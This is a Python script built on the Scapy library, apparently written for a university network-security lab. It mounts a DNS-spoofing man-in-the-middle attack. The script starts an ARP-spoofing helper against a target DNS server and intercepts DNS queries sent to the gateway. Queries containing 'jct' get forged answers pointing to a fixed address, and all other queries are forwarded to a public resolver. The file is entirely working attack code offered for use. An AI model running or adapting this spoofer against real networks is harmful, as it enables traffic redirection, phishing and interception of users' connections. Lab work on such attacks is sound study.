import argparse
from scapy.all import *
from scapy.layers.dns import DNSRR, DNSQR, DNS
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import *
import socket
import subprocess
import time


# global values with our data
iface = conf.iface
spoofed_address = '123.123.123.123'

# the dns_server and the gateway
target_dns_ip = '10.0.2.6'
ip_gateway = conf.route.route("0.0.0.0")[2]
ip_forward = '8.8.8.8'


def forward_dns(orig_pkt):
    print(f"Forwarding: {orig_pkt[DNSQR].qname}")
    response = sr1(
        IP(dst=ip_forward) /
        UDP(sport=orig_pkt[UDP].sport) /
        DNS(rd=1, id=orig_pkt[DNS].id, qd=DNSQR(qname=orig_pkt[DNSQR].qname)), verbose=0)
    resp_pkt = IP(dst=orig_pkt[IP].src, src=ip_gateway) / UDP(dport=orig_pkt[UDP].sport) / DNS()
    resp_pkt[DNS] = response[DNS]
    send(resp_pkt, verbose=0)
    return f"Responding to {orig_pkt[IP].src} | time: {time.time()}"


# in order to perform mitm and to respond only to specific packets
# there is need to keep send other packets
# def dns_responder(local_ip: str):
def get_response(pkt):
    if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0:
        query_name = pkt[DNSQR].qname.decode()
        print(query_name)
        if "jct" in query_name:
            spf_resp = IP(dst=pkt[IP].src, src=pkt[IP].dst) \
                       / UDP(dport=pkt[UDP].sport, sport=53) \
                       / DNS(id=pkt[DNS].id, ancount=1, qr=1, rd=1, qd=DNSQR(qtype='A', qname=query_name),
                             an=DNSRR(rrname=query_name, rdata=spoofed_address, type='A')) \
                       / DNSRR(type=41)

            send(spf_resp, verbose=0, iface=iface)
            return f"Spoofed DNS Response Sent: {pkt[IP].src}"

        else:
            # make DNS query, capturing the answer and send the answer
            return forward_dns(pkt)


def parse_flags():
    global target_dns_ip
    parser = argparse.ArgumentParser()
    # insert the args variables to CLI for help
    parser.add_argument("-t", "--target", required=True, help="IP of the target DNS")
    args = parser.parse_args()
    target_dns_ip = args.target


# catch port no. 53 in order to prevent 'port unreachable' exception
def init_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(('', 53))
    return s


# main
if __name__ == '__main__':
    parse_flags()
    spoofer = listener = None
    try:
        listener = init_socket()
        spoofer = subprocess.Popen(['python3', '/home/kali/Desktop/NetworkSecurity/Lab2/arp_spoofer.py',
                                    '-t', target_dns_ip, '-listener', ip_gateway])
        sniff(filter='udp port 53 and ip dst ' + ip_gateway, prn=get_response)
    except KeyboardInterrupt:
        if spoofer is not None:
            spoofer.kill()
        if listener is not None:
            listener.close()
